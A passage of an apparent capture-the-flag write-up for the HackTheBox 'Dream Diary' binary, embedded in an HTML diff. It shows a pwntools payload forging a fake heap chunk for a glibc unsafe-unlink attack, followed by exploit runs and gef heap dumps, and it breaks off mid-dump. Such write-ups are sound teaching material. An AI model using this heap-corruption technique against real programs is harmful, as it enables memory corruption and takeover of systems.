+payload += p64(global_ptr - 0x18)
+payload += p64(global_ptr - 0x10)
+payload = payload.ljust(0x80, b"X")
+payload += p64(0x80)
+payload += b"\x90"
+log.info("Fake chunk:\n%s" %(hexdump(payload)))</code></pre>
+<p>The fake chunk, if seen visually looks like:-</p>
+<pre class=" language-r"><code class="language-r"><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
+<span class="token operator">|</span>    <span class="token number">0</span>                  <span class="token operator">|</span>     <span class="token number">0</span>     <span class="token operator">|</span>
+<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
+<span class="token operator">|</span>          global_ptr <span class="token operator">-</span> <span class="token number">0x18</span>        <span class="token operator">|</span>
+<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
+<span class="token operator">|</span>          global_ptr <span class="token operator">-</span> <span class="token number">0x10</span>        <span class="token operator">|</span>
+<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
+<span class="token operator">|</span>                                   <span class="token operator">|</span>
+<span class="token operator">|</span>              XXXXXXXXXX           <span class="token operator">|</span>
+<span class="token operator">|</span>                                   <span class="token operator">|</span>
+<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>
+<span class="token operator">|</span>   <span class="token number">0x80</span>         <span class="token operator">|</span>         <span class="token number">0x90</span>     <span class="token operator">|</span>
+<span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span></code></pre>
+<p>Now, running the exploit:-</p>
+<pre class=" language-r"><code class="language-r"><span class="token number">0</span> <span class="token punctuation">[</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">31</span><span class="token operator">:</span><span class="token number">09</span><span class="token punctuation">]</span> vagrant<span class="token operator">@</span>oracle<span class="token punctuation">(</span>oracle<span class="token punctuation">)</span> HackTheBox<span class="token operator">></span> python3 chapter1.py 
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting program <span class="token string">'./chapter1'</span><span class="token operator">:</span> PID <span class="token number">2777</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Analyzing <span class="token operator">/</span>media<span class="token operator">/</span>sf_Pwning<span class="token operator">/</span>HackTheBox<span class="token operator">/</span>chapter1
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Analyzing <span class="token operator">/</span>home<span class="token operator">/</span>vagrant<span class="token operator">/</span>tools<span class="token operator">/</span>LibcSearcher<span class="token operator">/</span>libc<span class="token operator">-</span>database<span class="token operator">/</span>db<span class="token operator">/</span>libc6_2<span class="token number">.23</span><span class="token operator">-</span>0ubuntu10_amd64.so
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Created <span class="token number">5</span> chunks of size<span class="token operator">:</span> <span class="token number">0x88</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Paused <span class="token punctuation">[</span>Press any key to continue<span class="token punctuation">]</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Preparing a fake chunk<span class="token ellipsis">...</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Fake chunk<span class="token operator">:</span>
+    <span class="token number">00000000</span><span class="token operator">:</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  <span class="token operator">|</span><span class="token ellipsis">...</span><span class="token ellipsis">...</span><span class="token ellipsis">...</span><span class="token ellipsis">...</span><span class="token ellipsis">...</span>.<span class="token operator">|</span>
+    <span class="token number">00000010</span><span class="token operator">:</span>  c0 <span class="token number">20</span> <span class="token number">60</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  c8 <span class="token number">20</span> <span class="token number">60</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  <span class="token operator">|</span>. `<span class="token ellipsis">...</span><span class="token ellipsis">...</span> `<span class="token ellipsis">...</span>..<span class="token operator">|</span>
+    <span class="token number">00000020</span><span class="token operator">:</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token operator">|</span>XXXXXXXXXXXXXXXX<span class="token operator">|</span>
+    <span class="token number">00000030</span><span class="token operator">:</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token operator">|</span>XXXXXXXXXXXXXXXX<span class="token operator">|</span>
+    <span class="token number">00000040</span><span class="token operator">:</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token operator">|</span>XXXXXXXXXXXXXXXX<span class="token operator">|</span>
+    <span class="token number">00000050</span><span class="token operator">:</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token operator">|</span>XXXXXXXXXXXXXXXX<span class="token operator">|</span>
+    <span class="token number">00000060</span><span class="token operator">:</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token operator">|</span>XXXXXXXXXXXXXXXX<span class="token operator">|</span>
+    <span class="token number">00000070</span><span class="token operator">:</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token operator">|</span>XXXXXXXXXXXXXXXX<span class="token operator">|</span>
+    <span class="token number">00000080</span><span class="token operator">:</span>  <span class="token number">80</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>                           <span class="token operator">|</span><span class="token ellipsis">...</span><span class="token ellipsis">...</span>..<span class="token operator">|</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Editing chunk <span class="token number">3</span> with a fakr chunk
+
+<span class="token punctuation">[</span>..snip..<span class="token punctuation">]</span>
+
+
+gef➤  heap chunks
+Chunk<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x230a010</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x90</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>PREV_INUSE<span class="token punctuation">)</span>
+    <span class="token punctuation">[</span><span class="token number">0x000000000230a010</span>     <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>    AAAAAAAAAAAAAAAA<span class="token punctuation">]</span>
+Chunk<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x230a0a0</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x90</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>PREV_INUSE<span class="token punctuation">)</span>
+    <span class="token punctuation">[</span><span class="token number">0x000000000230a0a0</span>     <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span> <span class="token number">42</span>    BBBBBBBBBBBBBBBB<span class="token punctuation">]</span>
+Chunk<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x230a130</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x90</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>PREV_INUSE<span class="token punctuation">)</span>
+    <span class="token punctuation">[</span><span class="token number">0x000000000230a130</span>     <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span> <span class="token number">43</span>    CCCCCCCCCCCCCCCC<span class="token punctuation">]</span>
+Chunk<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x230a1c0</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x90</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>PREV_INUSE<span class="token punctuation">)</span>
+    <span class="token punctuation">[</span><span class="token number">0x000000000230a1c0</span>     <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>    <span class="token ellipsis">...</span><span class="token ellipsis">...</span><span class="token ellipsis">...</span><span class="token ellipsis">...</span><span class="token ellipsis">...</span>.<span class="token punctuation">]</span>
+Chunk<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x230a250</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x90</span><span class="token punctuation">,</span> flags<span class="token operator">=</span><span class="token punctuation">)</span>
+    <span class="token punctuation">[</span><span class="token number">0x000000000230a250</span>     <span class="token number">45</span> <span class="token number">45</span> <span class="token number">45</span> <span class="token number">45</span> <span class="token number">45</span> <span class="token number">45</span> <span class="token number">45</span> <span class="token number">45</span> <span class="token number">45</span> <span class="token number">45</span> <span class="token number">45</span> <span class="token number">45</span> <span class="token number">45</span> <span class="token number">45</span> <span class="token number">45</span> <span class="token number">45</span>    EEEEEEEEEEEEEEEE<span class="token punctuation">]</span>
+
+gef➤  x<span class="token operator">/</span>49xg <span class="token number">0x230a1c0</span> <span class="token operator">-</span> <span class="token number">0x10</span>
+<span class="token number">0x230a1b0</span><span class="token operator">:</span>    <span class="token number">0x4343434343434343</span>    <span class="token number">0x0000000000000091</span>
+<span class="token number">0x230a1c0</span><span class="token operator">:</span>    <span class="token number">0x0000000000000000</span>    <span class="token number">0x0000000000000000</span>
+<span class="token number">0x230a1d0</span><span class="token operator">:</span>    <span class="token number">0x00000000006020c0</span>    <span class="token number">0x00000000006020c8</span>
+<span class="token number">0x230a1e0</span><span class="token operator">:</span>    <span class="token number">0x5858585858585858</span>    <span class="token number">0x5858585858585858</span>
+<span class="token number">0x230a1f0</span><span class="token operator">:</span>    <span class="token number">0x5858585858585858</span>    <span class="token number">0x5858585858585858</span>
+<span class="token number">0x230a200</span><span class="token operator">:</span>    <span class="token number">0x5858585858585858</span>    <span class="token number">0x5858585858585858</span>
+<span class="token number">0x230a210</span><span class="token operator">:</span>    <span class="token number">0x5858585858585858</span>    <span class="token number">0x5858585858585858</span>
+<span class="token number">0x230a220</span><span class="token operator">:</span>    <span class="token number">0x5858585858585858</span>    <span class="token number">0x5858585858585858</span>
+<span class="token number">0x230a230</span><span class="token operator">:</span>    <span class="token number">0x5858585858585858</span>    <span class="token number">0x5858585858585858</span>
+<span class="token number">0x230a240</span><span class="token operator">:</span>    <span class="token number">0x0000000000000080</span>    <span class="token number">0x0000000000000090</span>
+<span class="token number">0x230a250</span><span class="token operator">:</span>    <span class="token number">0x4545454545454545</span>    <span class="token number">0x4545454545454545</span>
+<span class="token number">0x230a260</span><span class="token operator">:</span>    <span class="token number">0x4545454545454545</span>    <span class="token number">0x4545454545454545</span>
+<span class="token number">0x230a270</span><span class="token operator">:</span>    <span class="token number">0x4545454545454545</span>    <span class="token number">0x4545454545454545</span>
+<span class="token number">0x230a280</span><span class="token operator">:</span>    <span class="token number">0x4545454545454545</span>    <span class="token number">0x4545454545454545</span>
+<span class="token number">0x230a290</span><span class="token operator">:</span>    <span class="token number">0x4545454545454545</span>    <span class="token number">0x4545454545454545</span>
+<span class="token number">0x230a2a0</span><span class="token operator">:</span>    <span class="token number">0x4545454545454545</span>    <span class="token number">0x4545454545454545</span>
+<span class="token number">0x230a2b0</span><span class="token operator">:</span>    <span class="token number">0x4545454545454545</span>    <span class="token number">0x4545454545454545</span>
+<span class="token number">0x230a2c0</span><span class="token operator">:</span>    <span class="token number">0x4545454545454545</span>    <span class="token number">0x4545454545454545</span>
+<span class="token number">0x230a2d0</span><span class="token operator">:</span>    <span class="token number">0x4545454545454545</span>    <span class="token number">0x0000000000020d31</span></code></pre>
+<p>Here, the our forged chunk is within the 3rd chunk, our <code>fd</code> points to the <code>0x6020c0</code> and the <code>bk</code> to the <code>0x6020c8</code>, this aside, then we modified the <code>prev_size</code> of the chunk <code>0x230a1c0</code> to the <code>0x80</code> as it was <code>0x90</code> before, we did this because, our forged chunk must be considered from the <code>0x230a1c0</code> as from the we have an actual free’d chunk structure, then we made <code>prev_inuse</code> bit of the chunk <code>0x230a250</code> equal to the <code>0</code> to consider the chunk as a free’d chunk, so when we try to do <code>free(chunk4)</code> it’ll consolidate the adjacent chunks, hence doing an unsafe unlink, resulting in the <code>fd</code> of the free’d chunk pointing to the <code>0x6020c0</code>.</p>
+<p>Let’s free the chunk 4 and see the memory content to make this more clear.</p>
+<pre class=" language-r"><code class="language-r"><span class="token number">0</span> <span class="token punctuation">[</span><span class="token number">08</span><span class="token operator">:</span><span class="token number">53</span><span class="token operator">:</span><span class="token number">07</span><span class="token punctuation">]</span> vagrant<span class="token operator">@</span>oracle<span class="token punctuation">(</span>oracle<span class="token punctuation">)</span> HackTheBox<span class="token operator">></span> python3 chapter1.py 
+<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Starting program <span class="token string">'./chapter1'</span><span class="token operator">:</span> PID <span class="token number">2978</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Analyzing <span class="token operator">/</span>media<span class="token operator">/</span>sf_Pwning<span class="token operator">/</span>HackTheBox<span class="token operator">/</span>chapter1
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Analyzing <span class="token operator">/</span>home<span class="token operator">/</span>vagrant<span class="token operator">/</span>tools<span class="token operator">/</span>LibcSearcher<span class="token operator">/</span>libc<span class="token operator">-</span>database<span class="token operator">/</span>db<span class="token operator">/</span>libc6_2<span class="token number">.23</span><span class="token operator">-</span>0ubuntu10_amd64.so
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Created <span class="token number">5</span> chunks of size<span class="token operator">:</span> <span class="token number">0x88</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Preparing a fake chunk<span class="token ellipsis">...</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Fake chunk<span class="token operator">:</span>
+    <span class="token number">00000000</span><span class="token operator">:</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  <span class="token operator">|</span><span class="token ellipsis">...</span><span class="token ellipsis">...</span><span class="token ellipsis">...</span><span class="token ellipsis">...</span><span class="token ellipsis">...</span>.<span class="token operator">|</span>
+    <span class="token number">00000010</span><span class="token operator">:</span>  c0 <span class="token number">20</span> <span class="token number">60</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  c8 <span class="token number">20</span> <span class="token number">60</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  <span class="token operator">|</span>. `<span class="token ellipsis">...</span><span class="token ellipsis">...</span> `<span class="token ellipsis">...</span>..<span class="token operator">|</span>
+    <span class="token number">00000020</span><span class="token operator">:</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token operator">|</span>XXXXXXXXXXXXXXXX<span class="token operator">|</span>
+    <span class="token number">00000030</span><span class="token operator">:</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token operator">|</span>XXXXXXXXXXXXXXXX<span class="token operator">|</span>
+    <span class="token number">00000040</span><span class="token operator">:</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token operator">|</span>XXXXXXXXXXXXXXXX<span class="token operator">|</span>
+    <span class="token number">00000050</span><span class="token operator">:</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token operator">|</span>XXXXXXXXXXXXXXXX<span class="token operator">|</span>
+    <span class="token number">00000060</span><span class="token operator">:</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token operator">|</span>XXXXXXXXXXXXXXXX<span class="token operator">|</span>
+    <span class="token number">00000070</span><span class="token operator">:</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span> <span class="token number">58</span>  <span class="token operator">|</span>XXXXXXXXXXXXXXXX<span class="token operator">|</span>
+    <span class="token number">00000080</span><span class="token operator">:</span>  <span class="token number">80</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span> <span class="token number">00</span>  <span class="token number">90</span>                       <span class="token operator">|</span><span class="token ellipsis">...</span><span class="token ellipsis">...</span><span class="token ellipsis">...</span><span class="token operator">|</span>
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Editing chunk <span class="token number">3</span> with a fakr chunk
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Triggering Unlink
+<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Switching to interactive mode
+Done<span class="token operator">!</span>
+
+<span class="token operator">+</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span>
+<span class="token operator">|</span>         Dream Diary          <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span>
+<span class="token operator">|</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> Allocate                 <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> Edit                     <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> Delete                   <span class="token operator">|</span>
+<span class="token operator">|</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> Exit                     <span class="token operator">|</span>
+<span class="token operator">+</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">+</span>
+
+<span class="token punctuation">[</span>..snip..<span class="token punctuation">]</span>
+
+gef➤  heap chunks
+Chunk<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x2236010</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x90</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>PREV_INUSE<span class="token punctuation">)</span>
+    <span class="token punctuation">[</span><span class="token number">0x0000000002236010</span>     <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span> <span class="token number">41</span>    AAAAAAAAAAAAAAAA<span class="token punctuation">]</span>
+Chunk<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x22360a0</span><span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">0x90</span><span class="token punctuation">,</span> flags<span class="token operator">=</span>PREV_INUSE<span class="token punctuation">)</span>
